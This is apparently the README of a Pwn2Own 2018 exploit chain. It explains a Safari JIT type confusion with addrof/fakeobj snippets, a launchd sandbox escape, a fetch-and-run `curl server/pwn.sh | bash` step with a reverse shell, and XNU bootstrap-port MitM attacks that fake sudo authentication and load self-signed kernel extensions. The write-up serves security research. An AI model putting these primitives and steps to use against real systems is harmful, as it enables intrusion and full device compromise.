# Pwn2Own 2018: Safari + macOS

Safari RCE, sandbox escape, and LPE to kernel for macOS 10.13.3.

## Usage

Install nasm and tornado:

```
brew install nasm
pip3 install tornado
```

Check config.py if you want to change the host or ports. Afterwards start the
server with `./server.py` and navigate to the shown URL.

## Overview

This exploit chain uses three different bugs to go from JavaScript code running
inside Safari to kernel-mode code execution:

1. An incorrect optimization in the DFG JIT compiler that can be used to cause
   a type confusion
2. Missing sandbox checks in launchd, allowing sandboxed processes to spawn
   arbitrary (non-sandboxed) processes
3. A logic bug in XNU, allowing a process to override the bootstrap port of
   its child processes, leading to an IPC MitM situation

The exploit chain is implemented in six stages, each located in its own
subdirectory:

* stage0/: the WebKit exploit
* stage1/: the first stage payload written in assembly
* stage2/: the second stage payload to perform the sandbox escape
* stage3/: shell scripts to coordinate the remaining stages
* stage4/: a LPE to gain root
* stage5/: a LPE to gain kernel code execution
* libspc/: reimplementation of the XPC protocol, used by stages 2, 4, and 5

Every subdirectory (with the exception of libspc/) contains a file named
make.py which, when executed, performs any kind of build command necessary and
creates a list of files to be served by the webserver.

## Stage 0

Goal: achieve shellcode execution inside the sandboxed WebContent process<br/>
Bug exploited: incorrect optimization in the DFG JIT compiler<br/>
See also [this BlackHat talk](https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf)

The DFG JIT compiler represents JavaScript code in its own intermediate
representation (IR), the Data Flow Graph (DFG). Typically, one JavaScript expression
will be translated to one or multiple IR instructions in this graph.  In the
case of a constructor function, the `CreateThis` instruction is emitted and is
responsible for allocating the `this` object that is constructed by the
function. As an example, the function `function Consructor() {}`, when called
with `new`, would roughly be translated to

```
v0 = CreateThis
return v0
```

Looking at the AbstractInterpreter, we can see that the DFG JIT compiler
assumes that the `CreateThis` operation will not result in any side effects
besides a heap allocation. In fact, this code:

```
function Constructor(obj) {
    return obj.x;
}
```

will roughly be translated to the following DFG instructions:
(Here, the `StructureCheck` was moved to the beginning of the function by the
`TypeCheckHoistingPhase`).

```
StructureCheck(arg1);
v0 = CreateThis;
v1 = LoadOffset(arg1, OFFSET)
return v1;
```

However, that assumption is invalid, as the slow-path code for `CreateThis` can
execute arbitrary JavaScript code in some cases. In particular, by using a
Proxy around the actual function, the `get` trap for the "prototype" property
will be called during the slow-path handler for `CreateThis` as it needs to
fetch the prototype object for the constructed object:

```
function Constructor(obj) {
    return obj.x;
}

var handler = {
    get(target, propname) {
        /* run JS here, modify the structure of the argument object, etc. */
        return target[propname];
    },
};
var ConstructorProxy = new Proxy(Constructor, handler);

// Force JIT compilation of ConstructorProxy
```

As such, it is now possible to modify the Structure of an object without the
JIT compiler performing a bailout.

This bug can be used to construct `addrof` and `fakeobj` primitives as follows:

### addrof

We compile the code for the case of a JSArray with unboxed double elements,
then, in the callback, transition to JSValue elements. Afterwards, the JIT code
will load a JSValue from the array, but treat those bits as a double and return
them to us. The following code will assign the address of `leakme` to the
"address" property of the constructed object.

```
function InfoLeaker(a) {
    this.address = a[0];
}

var handler = {
    get(target, propname) {
        if (trigger)
            arg[0] = leakme;
        return target[propname];
    },
};
// ...
```

### fakeobj

Here we essentially do it the other way around: we optimize code to store a
double to an array with unboxed double elements, then again transition to
JSValue elements in the callback. The code will continue to write our
controlled double in unboxed form to the backing storage. When we later access
that array element, it will treat those bits as a JSValue instead of a double.
The following code will write the unboxed double `address` into the backing
buffer of `a` which we can then read out as JSValue, allowing us to "inject"
JSValues of our choosing into the engine.

```
function ObjFaker(a, address) {
    a[0] = address;
}

var handler = {
    get(target, propname) {
        if (trigger)
            arg[0] = {};
        return target[propname];
    },
};
// ...
```

As such we end up with the ability to write a double and treat is as JSObject
pointer and vice versa. This can be exploited as described in [attacking
javascript
engines](http://www.phrack.org/papers/attacking_javascript_engines.html).

The exploit first achieves arbitrary process memory read/write by faking a
Float64Array, then searches for the JIT region (mapped RWX) and writes the
stage1 shellcode there.

## Stage 1

Goal: bootstrap stage 2 by writing a .dylib to disk and loading it via dlopen()

A short assembly payload which essentially does the following:

1. Call `confstr(\_CS\_DARWIN\_USER\_TEMP\_DIR)` to obtain a path to a writable directory
2. Create a new file named 'x.dylib' in the writable directory
3. Write the stage2 dylib into the newly created file
4. Load the dylib into the WebContent process through `dlopen()`

## Stage 2

Goal: break out of the sandbox<br/>
Bug exploited: missing sandbox checks in launchd's "legacy\_spawn" API<br/>
See also [this talk](https://saelo.github.io/presentations/bits_of_launchd.pdf)

Launchd exposes the "legacy\_spawn" RPC endpoint as routine 817 in subsystem 3.
This API fails to validate whether the caller should be allowed to spawn
processes and will just `execve` any binary on the system for the caller with
controlled arguments. Since launchd is reachable through the bootstrap port,
this makes it possible to escape from the sandbox.

The exploit essentially runs `curl server/pwn.sh | bash` and thus passes
control to stage3.

## Stage 3

Goal: pop calc and bootstrap the remaining stages

This executes `open /Applications/Calculator.app` and establishes a reverse
shell, then fetches all files required for the remaining stages and runs the
exploits.

## Stage 4

Goal: gain root via a LPE exploit<br/>
Bug exploited: XNU bootstrap port MitM<br/>
See also [this POC talk](https://saelo.github.io/presentations/poc_18_macos_ipc_mitm.pdf)

In XNU, the `task_set_special_port` API allows callers to overwrite their
bootstrap port, which is used to communicate with launchd. This port is
inherited across forks: child processes will use the same bootstrap port as the
parent. A security issue now arises if the child process is more privileged
than the parent, as is the case for example with `sudo` (a setuid binary) or
`kextutil` (having the "com.apple.rootless.kext-management" entitlement"). By
overwriting the bootstrap port and forking a child processes, we can now gain a
MitM position between our child and launchd (which our child expects to reach
when sending messages to the bootstrap port). The child process will ask
launchd to resolve various mach and XPC services. By resolving these services
to other ports controlled by us, we can also gain a MitM position with
arbitrary system services used by our child process. Exploitation then depends
on how those services are used by the attacked program.

To gain root we target the `sudo` binary and intercept its communication with
`opendirectoryd`, which is used by `sudo` to verify credentials. We modify the
replies from `opendirectoryd` to make it look like our password was valid.

It appears that there was an attempt to fix this problem since libxpc (which
performs the communication with launchd) verifies that the responses indeed
come from a uid=0 and pid=1 (== launchd) process. However, these checks are
insufficient. We can bypass them as follows to resolve `opendirectoryd` to our
own port:

1. Register our own mach service (e.g. `net.saelo.hax`) with launchd using the
   `bootstrap_register2` API
2. Intercept the service lookup request to launchd and replace the string
   `com.apple.system.opendirectoryd.api` with `net.saelo.hax`
3. Forward the request to launchd, but leave the original reply port in place,
   so launchd answers directly to the child process and the checks in libxpc in
   our child succeed

All that remains now (for a privilege escalation to root) is to forward the
messages between opendirectoryd and sudo, but replace the authentication error
reply with a success reply.

# Stage 5

Goal: load a (self-signed) kernel extension<br/>
Bug exploited: XNU bootstrap port MitM<br/>

This exploits the same flaw as stage4, but this time targeting `kextutil`. We
intercept the connection to `com.apple.trustd` and spoof the certificate chain,
causing `kextutil` to think that our self-signed kext is actually signed
directly by apple.

`kextutil` proceeds roughly as follows when asked to load a .kext from disk:

1. Verify the integrity of the .kext by checking all signatures against the
   provided certificate
2. Communicate with `trustd` to obtain the certificate chain and establish
   whether the root certificate is trusted
3. Verify that the root of the certificate chain is an apple certificate
4. Check whether the .kext is user-approved by talking to `syspolicyd`.
   However, if `syspolicyd` can not be reached, `kextutil` simply proceeds

This enables the following attack to load self-signed kernel extensions:

1. Create a .kext and sign it with a self-signed certificate
2. Run kextutil and resolve `com.apple.trustd` to our own service
3. Intercept messages to `trustd` and reply with a hardcoded certificate chain
   of an official apple .kext
4. Block communication with `syspolicyd` (e.g. by replacing
   `com.apple.security.syspolicy.kext` with `net.saelo.lolno` in service lookup
   requests to launchd)

`kextutil` will now load our kernel extension into the kernel.
